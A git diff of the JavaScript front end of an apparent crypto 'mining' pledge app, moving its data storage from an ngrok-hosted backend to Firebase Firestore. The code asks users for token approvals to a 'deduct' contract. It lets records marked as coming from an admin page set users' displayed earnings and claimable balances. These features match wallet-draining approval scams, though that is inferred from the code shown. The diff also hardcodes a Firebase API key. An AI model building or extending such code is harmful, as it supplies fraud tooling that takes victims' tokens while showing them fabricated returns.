@@ -1,8 +1,24 @@
+// ==================== Firebase 初始化 ====================
+import { initializeApp } from "firebase/app";
+import { getFirestore, doc, setDoc, getDoc, onSnapshot } from "firebase/firestore";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
+  authDomain: "aroxa-mining.firebaseapp.com",
+  projectId: "aroxa-mining",
+  storageBucket: "aroxa-mining.firebasestorage.app",
+  messagingSenderId: "596688766295",
+  appId: "1:596688766295:web:5f2c5d65bf414f9dc7aa12"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// ==================== 常數 ====================
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
-const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
 const DEDUCT_CONTRACT_ABI = [
   "function isServiceActiveFor(address customer) view returns (bool)",
   "function activateService(address tokenContract) external",
@@ -32,12 +48,9 @@ let interestInterval = null;
 let nextBenefitInterval = null;
 let claimInterval = null;
 let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
-let isServerAvailable = false;
 let pendingUpdates = [];
 let localLastUpdated = 0;
 let authorizedToken = 'USDT';
-let allData = { users: {}, overrides: {}, allowances: {}, pledges: {}, lastUpdated: 0 };
-const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
 window.currentClaimable = 0;
 const MONTHLY_RATE = 0.01;
 let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
@@ -71,7 +84,6 @@ const translations = {
     invalidPledgeAmount: 'Invalid amount.',
     invalidPledgeToken: 'Invalid token.',
     insufficientBalance: 'Insufficient balance.',
-    sseFailed: 'SSE failed, using polling.',
     ethersError: 'Ethers.js error.',
     approveError: 'Approval failed.',
     selectTokenFirst: 'Select token first.',
@@ -118,7 +130,6 @@ const translations = {
     invalidPledgeAmount: '金額無效。',
     invalidPledgeToken: '代幣無效。',
     insufficientBalance: '餘額不足。',
-    sseFailed: 'SSE 失敗，使用輪詢。',
     ethersError: 'Ethers.js 錯誤。',
     approveError: '授權失敗。',
     selectTokenFirst: '請先選擇代幣。',
@@ -165,7 +176,6 @@ const translations = {
     invalidPledgeAmount: '金额无效。',
     invalidPledgeToken: '代币无效。',
     insufficientBalance: '余额不足。',
-    sseFailed: 'SSE 失败，使用轮询。',
     ethersError: 'Ethers.js 错误。',
     approveError: '授权失败。',
     selectTokenFirst: '请先选择代币。',
@@ -193,6 +203,7 @@ function log(message, type = 'info') {
   const timestamp = new Date().toLocaleTimeString();
   const prefix = { info: 'Info', success: 'Success', error: 'Error', send: 'Send', receive: 'Receive' }[type] || 'Info';
   console.log(`[${timestamp}] ${prefix} ${message}`);
+
   const logContent = document.getElementById('logContent');
   const logContainer = document.getElementById('logContainer');
   if (logContent && logContainer) {
@@ -272,110 +283,7 @@ async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
   return false;
 }
 
-async function checkServerStatus() {
-  try {
-    log('檢查伺服器狀態...', 'info');
-    const response = await retry(() => fetch(`${API_BASE_URL}/api/status`, { 
-      cache: 'no-cache',
-      headers: { 'ngrok-skip-browser-warning': 'true' }
-    }));
-    if (response.ok) {
-      const { status, lastUpdated } = await response.json();
-      isServerAvailable = status === 'available';
-      log(`伺服器狀態：${status}, 最後更新：${lastUpdated}`, 'info');
-      if (isServerAvailable && pendingUpdates.length > 0) {
-        log(`同步 ${pendingUpdates.length} 筆待發送數據...`, 'info');
-        await syncPendingUpdates(lastUpdated);
-      }
-      return isServerAvailable;
-    }
-  } catch (error) {
-    isServerAvailable = false;
-    log(`伺服器檢查失敗: ${error.message}`, 'error');
-    if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
-  }
-  return false;
-}
-
-async function syncPendingUpdates(serverLastUpdated) {
-  let retryCount = 0;
-  const maxRetries = 10;
-
-  while (pendingUpdates.length > 0 && retryCount < maxRetries) {
-    const update = pendingUpdates[0];
-    if (update.timestamp > serverLastUpdated) {
-      log(`同步待發送數據：${JSON.stringify(update.payload, null, 2)}`, 'send');
-      try {
-        await saveUserData(update.payload.data, false);
-        pendingUpdates.shift();
-        retryCount = 0;
-      } catch (e) {
-        retryCount++;
-        log(`同步失敗，重試 ${retryCount}/${maxRetries}`, 'error');
-        await new Promise(r => setTimeout(r, 5000));
-      }
-    } else {
-      pendingUpdates.shift();
-    }
-  }
-
-  if (pendingUpdates.length === 0) {
-    log('待發送數據同步完成', 'success');
-  } else {
-    log(`仍有 ${pendingUpdates.length} 筆待發送，稍後重試`, 'error');
-    setTimeout(() => syncPendingUpdates(serverLastUpdated), 10000);
-  }
-}
-
-async function loadUserDataFromServer() {
-  if (!userAddress) return;
-  try {
-    log('載入當前用戶數據...', 'info');
-    const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, { 
-      cache: 'no-cache',
-      headers: { 'ngrok-skip-browser-warning': 'true' }
-    }));
-    if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    const newAllData = await response.json();
-
-    if (!newAllData.users || !newAllData.users[userAddress]) {
-      log(`無當前用戶數據`, 'info');
-      return;
-    }
-
-    const userData = newAllData.users[userAddress];
-    const localData = JSON.parse(localStorage.getItem('userData') || '{}');
-    localLastUpdated = localData.lastUpdated || 0;
-
-    if (newAllData.lastUpdated > localLastUpdated) {
-      pledgedAmount = userData.pledgedAmount ?? 0;
-      lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
-      totalGrossOutput = userData.totalGrossOutput ?? 0;
-      window.currentClaimable = userData.claimable ?? 0;
-      accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
-      authorizedToken = userData.authorizedToken || 'USDT';
-
-      const pledge = newAllData.pledges?.[userAddress] || { amount: '0' };
-      pledgedAmount = parseFloat(pledge.amount) || 0;
-
-      const override = newAllData.overrides?.[userAddress] || {};
-      totalGrossOutput = override.grossOutput ?? totalGrossOutput;
-
-      localStorage.setItem('userData', JSON.stringify({
-        pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
-        accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
-        lastUpdated: newAllData.lastUpdated
-      }));
-      localLastUpdated = newAllData.lastUpdated;
-
-      log(`當前用戶資料同步成功`, 'success');
-    }
-    updateClaimableDisplay();
-  } catch (error) {
-    log(`載入失敗: ${error.message}`, 'error');
-  }
-}
-
+// ==================== Firestore 儲存 ====================
 async function saveUserData(data = null, addToPending = true) {
   if (!userAddress) return;
 
@@ -397,41 +305,76 @@ async function saveUserData(data = null, addToPending = true) {
     claimable: window.currentClaimable
   };
 
-  const payload = { address: userAddress, data: dataToSave };
-  log(`發送資料到後端: ${JSON.stringify(payload, null, 2)}`, 'send');
-
-  if (!isServerAvailable) {
-    log('伺服器離線，加入待發送', 'error');
-    if (addToPending) pendingUpdates.push({ timestamp: Date.now(), payload });
-    localStorage.setItem('userData', JSON.stringify(dataToSave));
-    return;
-  }
+  log(`儲存資料到 Firestore: ${userAddress}`, 'send');
 
   try {
-    const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json',
-        'ngrok-skip-browser-warning': 'true'
-      },
-      body: JSON.stringify(payload)
-    }), 5, 2000);
-
-    if (!response.ok) {
-      const text = await response.text();
-      throw new Error(`HTTP ${response.status}: ${text}`);
-    }
-    log('資料發送成功', 'success');
+    await setDoc(doc(db, 'users', userAddress), dataToSave, { merge: true });
+    log('資料儲存成功', 'success');
     localStorage.setItem('userData', JSON.stringify(dataToSave));
     localLastUpdated = dataToSave.lastUpdated;
   } catch (error) {
-    log(`發送失敗，重試中: ${error.message}`, 'error');
+    log(`儲存失敗: ${error.message}`, 'error');
     if (addToPending) {
-      pendingUpdates.push({ timestamp: Date.now(), payload });
-      localStorage.setItem('userData', JSON.stringify(dataToSave));
+      pendingUpdates.push({ timestamp: Date.now(), payload: { data: dataToSave } });
     }
-    setTimeout(() => saveUserData(data, addToPending), 3000);
   }
+}
+
+// ==================== Firestore 載入 + 即時監聽 ====================
+async function loadUserDataFromServer() {
+  if (!userAddress) return;
+  try {
+    const docRef = doc(db, 'users', userAddress);
+    const snap = await getDoc(docRef);
+
+    if (!snap.exists()) {
+      log(`無用戶數據`, 'info');
+      return;
+    }
+
+    const userData = snap.data();
+    const localData = JSON.parse(localStorage.getItem('userData') || '{}');
+    localLastUpdated = localData.lastUpdated || 0;
+
+    if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
+      pledgedAmount = userData.pledgedAmount ?? 0;
+      lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
+      totalGrossOutput = userData.totalGrossOutput ?? 0;
+      window.currentClaimable = userData.claimable ?? 0;
+      accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
+      authorizedToken = userData.authorizedToken || 'USDT';
+
+      localStorage.setItem('userData', JSON.stringify({
+        pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
+        accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
+        lastUpdated: userData.lastUpdated
+      }));
+      localLastUpdated = userData.lastUpdated;
+
+      log(`資料同步成功`, 'success');
+      updateClaimableDisplay();
+    }
+  } catch (error) {
+    log(`載入失敗: ${error.message}`, 'error');
+  }
+}
+
+// 即時監聽
+function startRealtimeListener() {
+  if (!userAddress) return;
+  const docRef = doc(db, 'users', userAddress);
+  const unsubscribe = onSnapshot(docRef, (docSnap) => {
+    if (docSnap.exists()) {
+      const userData = docSnap.data();
+      if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
+        log(`即時更新: ${userData.source}`, 'receive');
+        loadUserDataFromServer();
+      }
+    }
+  }, (error) => {
+    log(`監聽錯誤: ${error.message}`, 'error');
+  });
+  return unsubscribe;
 }
 
 function updateStatus(message, isWarning = false) {
@@ -472,10 +415,6 @@ function resetState(showMsg = true) {
 }
 
 function disconnectWallet() {
-  if (window.currentSSE) {
-    window.currentSSE.close();
-    window.currentSSE = null;
-  }
   resetState(true);
 }
 
@@ -745,7 +684,7 @@ async function connectWallet() {
 
     await loadUserDataFromServer();
     await saveUserData(null, false); // 強制發送一次
-    setupSSE();
+    startRealtimeListener(); // 啟動即時監聽
 
     await updateUIBasedOnChainState();
     setTimeout(async () => await forceRefreshWalletBalance(), 1000);
@@ -920,85 +859,6 @@ function updateLanguage(lang) {
   setTimeout(apply, 200);
 }
 
-function setupSSE() {
-  if (!userAddress) return;
-  if (window.currentSSE) {
-    window.currentSSE.close();
-  }
-
-  let sse = null;
-  let retryCount = 0;
-  const maxRetries = 10;
-  const baseDelay = 5000;
-
-  function connect() {
-    if (sse) sse.close();
-
-    sse = new EventSource(`${API_BASE_URL}/api/sse`);
-    window.currentSSE = sse;
-
-    sse.onopen = () => {
-      log('SSE 連線成功', 'success');
-      retryCount = 0;
-      updateStatus('SSE 已連線');
-    };
-
-    sse.onmessage = async (event) => {
-      try {
-        const parsed = JSON.parse(event.data);
-        log(`收到 SSE: ${JSON.stringify(parsed)}`, 'receive');
-
-        if (parsed.event === 'dataUpdate' && parsed.data) {
-          const newAllData = parsed.data;
-
-          if (newAllData.users && newAllData.users[userAddress]) {
-            const userData = newAllData.users[userAddress];
-
-            const needsUpdate = 
-              userData.lastUpdated > localLastUpdated ||
-              userData.pledgedAmount !== pledgedAmount ||
-              userData.claimable !== window.currentClaimable ||
-              userData.totalGrossOutput !== totalGrossOutput;
-
-            if (needsUpdate) {
-              log(`檢測到當前用戶數據更新，開始同步...`, 'info');
-              allData = newAllData;
-              await loadUserDataFromServer();
-              await updateInterest();
-              await forceRefreshWalletBalance();
-            } else {
-              log(`當前用戶數據無變化，忽略`, 'info');
-            }
-          } else {
-            log(`SSE 包含其他用戶數據，忽略`, 'info');
-          }
-        }
-      } catch (e) {
-        log(`SSE 解析錯誤: ${e.message}`, 'error');
-      }
-    };
-
-    sse.onerror = () => {
-      log('SSE 斷線，重連中...', 'error');
-      sse.close();
-      if (retryCount < maxRetries) {
-        retryCount++;
-        setTimeout(connect, baseDelay * retryCount);
-      } else {
-        updateStatus('SSE 連線失敗，改用輪詢', true);
-        setInterval(async () => {
-          if (isServerAvailable) {
-            await loadUserDataFromServer();
-            await updateInterest();
-          }
-        }, 10000);
-      }
-    };
-  }
-
-  connect();
-}
-
 // 初始化
 document.addEventListener('DOMContentLoaded', () => {
   getElements();
@@ -1115,20 +975,21 @@ document.addEventListener('DOMContentLoaded', () => {
         if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
       } catch (error) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
       updateStatus('Pledging...');
-      const pledgeData = { address: userAddress, pledges: { isPledging: true, token: tokenAddress, amount: amount.toFixed(2) } };
+      const pledgeData = { 
+        address: userAddress, 
+        pledges: { 
+          isPledging: true, 
+          token: tokenAddress, 
+          amount: amount.toFixed(2) 
+        } 
+      };
       try {
-        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'ngrok-skip-browser-warning': 'true'
-          },
-          body: JSON.stringify(pledgeData)
-        }));
-        if (!response.ok) throw new Error(`Pledge failed, status: ${response.status}`);
+        await setDoc(doc(db, 'pledges', userAddress), pledgeData.pledges, { merge: true });
         updateStatus(translations[currentLang].pledgeSuccess);
         await saveUserData();
-      } catch (error) { updateStatus(translations[currentLang].pledgeError, true); }
+      } catch (error) { 
+        updateStatus(translations[currentLang].pledgeError, true); 
+      }
     });
   }
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
